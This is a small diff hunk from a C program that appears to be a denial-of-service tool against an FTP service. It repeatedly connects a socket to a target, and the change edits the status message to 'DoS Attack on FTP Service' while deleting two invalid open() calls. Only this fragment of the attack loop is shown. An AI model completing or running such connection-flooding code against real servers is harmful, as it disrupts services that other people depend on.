@@ -18,9 +18,7 @@ int main(int argc, char **argv){
     connecta = connect(mysocket, (struct sockaddr *)&target, sizeof target);
   
     if(connecta == 0){
-      printf("Realizando DoS\n");
-      open(mysocket);
-      open(connecta);
+      printf("DoS Attack on FTP Service\n");
     }
     else{break;}
     
